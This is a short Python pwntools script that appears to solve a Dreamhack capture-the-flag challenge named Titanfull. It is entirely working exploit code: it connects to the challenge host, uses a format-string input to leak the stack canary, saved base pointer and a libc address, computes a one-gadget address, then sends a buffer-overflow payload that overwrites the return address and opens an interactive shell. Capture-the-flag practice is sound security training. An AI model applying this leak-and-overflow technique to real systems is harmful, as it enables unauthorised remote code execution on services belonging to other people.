from pwn import *

port = 21873
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/Titanfull/problem/titanfull")
lib = ELF("./Pwnable/Titanfull/problem/libc-2.31.so")

lib_start_main_offset = lib.symbols['__libc_start_main']

rem.sendlineafter(b"> ", b"%17$p\n%18$p\n%21$p")
rem.recvuntil(b"0x")
canary = int(rem.recvn(16), 16)
rbp = int(rem.recvn(14), 16)
rem.recvuntil(b"0x")
lib_base = int(rem.recvn(12), 16) - 243 - lib_start_main_offset
gadget_addr = lib_base + 0xe3b01

rem.sendlineafter(b"> ", b"7274")
payload = b"A" * 0x18 + p64(canary) + p64(rbp) + p64(gadget_addr)
rem.sendlineafter(b": ", payload)

rem.interactive()

